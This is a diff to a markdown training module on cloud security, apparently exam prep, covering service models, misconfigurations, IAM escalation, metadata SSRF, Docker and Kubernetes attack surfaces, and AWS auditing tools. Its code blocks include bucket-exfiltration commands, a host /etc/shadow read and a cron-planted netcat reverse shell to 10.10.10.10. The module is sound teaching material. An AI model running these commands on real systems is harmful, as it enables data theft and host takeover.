@@ -56,9 +56,18 @@
 
 ---
 
+> [!TIP]
+> **💡 In Simple Words — What Module 19 Is Really About:**  
+> Think of **Cloud Computing** like housing:  
+> - **On-Premises:** You own the house and fix everything (roof, plumbing, locks, furniture).  
+> - **IaaS (AWS EC2):** Renting an *empty house* — AWS fixes the roof/wiring (hardware), *you* patch the OS and lock the doors!  
+> - **PaaS (Heroku / Elastic Beanstalk):** Renting a *serviced apartment* — the landlord maintains the OS; you just bring your code & data.  
+> - **SaaS (Microsoft 365):** Staying in a *hotel* — just manage your login & data!  
+> - **Most Common Cloud Hacks:** Leaving public storage buckets (`S3`) unlocked, handing `*` admin keys to weak IAM accounts, using **SSRF** to rob the internal cloud badge kiosk (**`169.254.169.254`**, defeated by **IMDSv2** `PUT` tokens!), and escaping misconfigured Docker containers (`--privileged` or port `2375`)!
+
 ## 1. Cloud Computing Frameworks & Architectural Models
 
-### NIST Cloud Service Models
+### NIST Cloud Service Models (IaaS, PaaS, SaaS, FaaS)
 
 The National Institute of Standards and Technology (NIST SP 800-145) defines three primary service models, alongside modern serverless architectures:
 
@@ -108,7 +117,7 @@ Understanding where customer liability ends and CSP liability begins is fundamen
 
 ---
 
-### NIST Cloud Deployment Models
+### NIST Cloud Deployment Models (Public, Private, Hybrid, Community)
 
 ```
 +--------------------------------------------------------------------------+
@@ -133,8 +142,13 @@ Understanding where customer liability ends and CSP liability begins is fundamen
 ## 2. Cloud Threat Landscape & Primary Vulnerabilities
 
 ### Root Cause: Misconfigurations as the Primary Attack Vector
+Unlike on-premises infrastructure breaches driven largely by unpatched software exploits, **the overwhelming majority of cloud breaches stem from customer misconfigurations** (exposed storage buckets, wildcard IAM policies, IMDSv1 SSRF, and missing audit logs).
 
-The Cloud Security Alliance (CSA) consistently highlights that the overwhelming majority of cloud breaches originate from **customer misconfiguration** rather than CSP infrastructure flaws:
+### Cloud Attack Surfaces (IAM, Storage, APIs, Virtualization)
+Every cloud tenant relies on **control-plane APIs**, **identity policies**, **object storage permissions**, and **multi-tenant hypervisors**. Unlike physical data centers where a perimeter firewall wraps everything, **in the cloud Identity *is* the perimeter**.
+
+### Cloud Security Alliance (CSA) Treacherous 12 / Top Threats
+The Cloud Security Alliance consistently highlights that the overwhelming majority of cloud breaches originate from **customer misconfiguration** rather than CSP infrastructure flaws (Data Breaches, Misconfiguration & Inadequate Change Control, Insufficient Identity/Key Management, Account Hijacking, Insecure APIs):
 * **Overprivileged IAM Roles**: Assigning wildcard `*` permissions to standard service accounts.
 * **Public Storage Buckets**: Inadvertently exposing proprietary source code, customer records, and database backups to unauthenticated Internet users.
 * **Hardcoded API Secrets**: Committing AWS Secret Keys or private service account tokens into public GitHub repositories.
@@ -161,7 +175,11 @@ aws s3 sync s3://target-company-backups ./stolen_data --no-sign-request
 aws s3 cp exploit.sh s3://target-company-backups/exploit.sh --no-sign-request
 ```
 
-### Automating Storage Discovery
+### Azure Blob Storage & Google Cloud Storage (GCS) Reconnaissance
+* **Azure Blob Containers:** `https://<account>.blob.core.windows.net/<container>?restype=container&comp=list`
+* **Google Cloud Storage:** `https://storage.googleapis.com/<bucket-name>` or `gsutil ls gs://<bucket-name>`
+
+### Automating Storage Discovery (`aws-cli`, S3Scanner, Cloud-Enum)
 
 ```bash
 # Using s3scanner to audit a list of prospective bucket names
@@ -174,6 +192,9 @@ cloud-enum -k targetcompany -q
 ---
 
 ## 4. Identity & Access Management (IAM) Exploitation
+
+### IAM Policy Evaluation & Wildcard Permissions
+Cloud IAM evaluates explicit **`Deny`** first (which always overrides everything!), then explicit **`Allow`**, and falls back to **Implicit Deny**. Dangerous wildcard permissions (`"Action": "*"`, `"Resource": "*"`) give compromised developer keys effective root access.
 
 ### High-Yield IAM Privilege Escalation Vectors
 
@@ -195,16 +216,22 @@ If an attacker compromises a low-privilege AWS access key, they search for misco
 * **`iam:AttachUserPolicy`**: The compromised user can attach the managed policy `AdministratorAccess` directly to their own account.
 * **`iam:CreateAccessKey`**: Allows the attacker to generate new access keys for existing high-privilege administrative accounts.
 * **`iam:PassRole`**: Allows passing an existing high-privilege IAM service role to a newly launched EC2 instance or Lambda function to execute commands in that role's context.
-* **`sts:AssumeRole`**: Allows assuming another role with elevated privileges if trust relationships permit:
+
+### AssumeRole Lateral Movement & Cross-Account Pivoting
+* **`sts:AssumeRole`**: Allows assuming another role with elevated privileges or pivoting into another AWS account if trust relationships permit:
   ```bash
   aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevSecOpsAdmin --role-session-name EscalationSession
   ```
+
+### Offensive Cloud Frameworks: Pacu & MicroBurst
+* **Pacu:** Open-source AWS exploitation framework (modular like Metasploit for AWS IAM enumeration, Lambda backdoors, and S3 exfiltration).
+* **MicroBurst:** PowerShell toolkit specialized for auditing and exploiting Microsoft Azure storage, App Services, and Azure AD/Entra ID misconfigurations.
 
 ---
 
 ## 5. Instance Metadata Service (IMDS) Interrogation
 
-### IMDSv1 SSRF Exploitation Mechanics
+### IMDSv1 SSRF Exploitation Mechanics (169.254.169.254)
 
 In AWS, EC2 instances can query an internal, link-local metadata address (**`169.254.169.254`**) to retrieve operational parameters and temporary IAM role credentials:
 
@@ -235,7 +262,7 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-da
 
 ---
 
-### Cross-Cloud Metadata Endpoints
+### Cross-Cloud Metadata Comparison (AWS vs. Azure vs. GCP)
 
 | Cloud Provider | Metadata IP Address & Endpoint | Mandatory Security Header |
 | :--- | :--- | :--- |
@@ -262,7 +289,7 @@ docker -H tcp://192.168.1.100:2375 run -v /:/host -it ubuntu chroot /host /bin/b
 
 ---
 
-### Container Breakout: Privileged Containers
+### Container Breakout: Privileged Containers & Namespace Escapes
 
 When a container is launched with the **`--privileged`** flag, all kernel capabilities are granted to the container, and host device files are exposed:
 
@@ -279,6 +306,11 @@ mount /dev/sda1 /mnt/host
 cat /mnt/host/etc/shadow
 echo "* * * * * root nc 10.10.10.10 4444 -e /bin/bash" >> /mnt/host/etc/crontab
 ```
+
+### Kubernetes Attack Surfaces (API Server, Kubelet, etcd)
+* **API Server (Port 6443):** Core K8s management brain; misconfigured anonymous RBAC (`system:anonymous`) lets attackers deploy privileged DaemonSets across all cluster nodes.
+* **Kubelet API (Port 10250):** Unauthenticated worker node endpoint allowing remote code execution inside running pods (`/run`).
+* **etcd (Port 2379):** Key-value store housing the entire cluster state and **all unencrypted Kubernetes Secrets**!
 
 ---
 
@@ -311,25 +343,32 @@ echo "* * * * * root nc 10.10.10.10 4444 -e /bin/bash" >> /mnt/host/etc/crontab
 +--------------------------------------------------------------------------+
 ```
 
+### Cloud Auditing: CloudTrail, CloudWatch, GuardDuty, and Security Hub
+* **AWS CloudTrail:** Logs *who called which API* across all regions (Audit trail).
+* **Amazon CloudWatch:** Monitors real-time CPU/memory/log metrics and operational alarms.
+* **Amazon GuardDuty:** AI/ML threat detection analyzing CloudTrail, VPC Flow Logs, and DNS logs automatically.
+* **AWS Security Hub:** Unified posture dashboard aggregating CSPM checks and GuardDuty findings.
+
 ---
 
 ## 8. Master Decision Tree & Flowchart
 
-```
-                          [ CLOUD ENVIRONMENT AUDIT ]
-                                       |
-                     What layer is being investigated?
-                       /               |               \
-                [ STORAGE ]        [ COMPUTE ]       [ IDENTITY ]
-                     |                 |                  |
-              Audit S3 Bucket     Is it EC2 or VM?    Audit IAM Policies
-              permissions:        Query Metadata      Check for:
-              Check for Public    (169.254.169.254)   iam:AttachUserPolicy
-              read/write access   Check IMDSv2 token  iam:PassRole
-                                       |              sts:AssumeRole
-                               Is it Containerized?
-                               Check Docker 2375
-                               Check --privileged flag
+```mermaid
+flowchart TD
+    Cloud["Cloud Environment Security Audit"] --> Layer{"Which Cloud Layer?"}
+    Layer -- "Object Storage" --> S3["Audit S3 / Blob / GCS ACLs<br/>Test --no-sign-request & Cloud-Enum"]
+    Layer -- "Identity (IAM)" --> IAM["Review Policies & Trust Rules<br/>Check PassRole, AssumeRole, Wildcards"]
+    Layer -- "Compute & Metadata" --> IMDS["Test SSRF vs 169.254.169.254<br/>Verify IMDSv2 Session Token Enforced"]
+    Layer -- "Containers & K8s" --> Cont["Check Docker TCP 2375, --privileged,<br/>Kubelet 10250 & etcd 2379"]
+
+    S3 --> Fix["Apply Least Privilege + CSPM/CIEM + CloudTrail"]
+    IAM --> Fix
+    IMDS --> Fix
+    Cont --> Fix
+
+    style Cloud fill:#0f172a,stroke:#06b6d4,stroke-width:2px,color:#fff
+    style Layer fill:#1e293b,stroke:#3b82f6,color:#fff
+    style Fix fill:#064e3b,stroke:#22c55e,stroke-width:2px,color:#fff
 ```
 
 ---
